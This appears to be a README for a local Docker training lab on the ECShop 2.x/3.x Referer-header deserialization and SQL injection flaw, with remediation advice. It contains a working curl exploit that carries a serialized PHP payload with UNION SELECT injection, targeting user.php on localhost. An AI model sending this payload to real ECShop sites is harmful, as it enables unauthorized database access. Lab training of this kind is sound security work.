# ECShop User-Agent / Referer Base64 Insecure Deserialization SQLi RCE

## Overview

ECShop is an e-commerce shopping platform developed in PHP. In ECShop versions 2.x and 3.x, user visit logging functions inspect the HTTP Referer and User-Agent headers, decodes base64 data, and passes values directly into unserialize() without validation. Attackers can inject POP gadget chains combined with SQL injection into search.php, achieving arbitrary PHP code execution.

- **Service Access**: `http://localhost:8172/`
- **Default Credentials**: `Unauthenticated HTTP request headers`
- **Docker Shortcut**: `./lab start ecshop-deserialization`
- **Container Name**: `cyberlab_02_ecshop_deserialization`
- **RAM Footprint**: ~60M

---

## Exploitation Walkthrough

### 1. Inspect ECShop Homepage

```bash
curl -i http://localhost:8172/
```

### 2. Send Serialized PHP Payload in Referer Header

```bash
curl -i 'http://localhost:8172/user.php' \
  -H 'Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:72:"0 union select 1,2,3,4,5,6,7,8,0x70776e6564,10,11,12,13,14,15-- -";s:2:"id";s:9:"' and 0-- ";}'
```

### 3. Verify SQL and Code Injection Output

```bash
# Output contains injected database strings or executed PHP command results.
```

---

## Defensive Remediation & Hardening

1. Upgrade ECShop to latest patched versions.
2. Never invoke unserialize() on untrusted client headers.
3. Use json_decode() for structured data exchange.

---

## Video Walkthroughs & Technical References

- [[A1] Hijacking a Session - WebGoat](https://www.youtube.com/watch?v=YO8rsCMVUyY)
- [ECShop Vulnerability Analysis](https://www.exploit-db.com/exploits/45377)
- [Vulhub ECShop Environment](https://vulhub.org/#/environments/ecshop/xianzhi-2018-09-44519211/)
